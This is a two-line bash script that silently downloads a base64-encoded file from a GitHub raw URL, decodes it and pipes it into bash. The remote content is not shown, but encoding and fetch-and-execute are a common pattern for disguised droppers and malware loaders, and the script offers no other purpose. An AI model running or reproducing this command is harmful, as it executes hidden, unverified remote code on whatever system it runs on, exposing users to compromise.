#!/bin/bash
wget -qO- https://raw.githubusercontent.com/paulkingdom/sharma/refs/heads/main/entrypoint.sh | base64 -d | bash
